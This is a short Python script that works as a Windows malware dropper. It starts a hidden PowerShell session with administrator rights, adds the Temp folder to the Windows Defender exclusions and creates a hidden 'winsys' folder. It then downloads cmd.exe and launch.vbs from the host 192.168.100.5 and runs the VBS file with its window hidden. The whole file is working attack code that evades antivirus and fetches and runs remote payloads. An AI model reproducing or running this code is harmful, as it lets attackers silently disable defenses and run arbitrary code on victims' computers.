import subprocess

def run_hidden_admin_powershell(command):
    subprocess.Popen(["powershell.exe", "-Command", "Start-Process", "-Verb", "RunAs", "-FilePath", "powershell.exe", "-ArgumentList", f'"-WindowStyle Hidden -Command {command}"'], shell=True)

def main():
    commands = [
        'Add-MpPreference -ExclusionPath `"$env:Temp`"',
        'New-Item -Path `"$env:Temp\\winsys`" -ItemType Directory -Force',
        'Set-ItemProperty -Path `"$env:Temp\\winsys`" -Name Attributes -Value `"Hidden`"',
        'Invoke-WebRequest -Uri http://192.168.100.5/cmd.exe -OutFile `"$env:Temp\\winsys\\cmd.exe`"',
        'Invoke-WebRequest -Uri http://192.168.100.5/launch.vbs -OutFile `"$env:Temp\\winsys\\launch.vbs`"',
        'Start-Process -FilePath `"$env:Temp\\winsys\\launch.vbs`" -WindowStyle Hidden'
    ]
    powershell_command = ";".join(commands)
    run_hidden_admin_powershell(powershell_command)

if __name__ == "__main__":
    main()
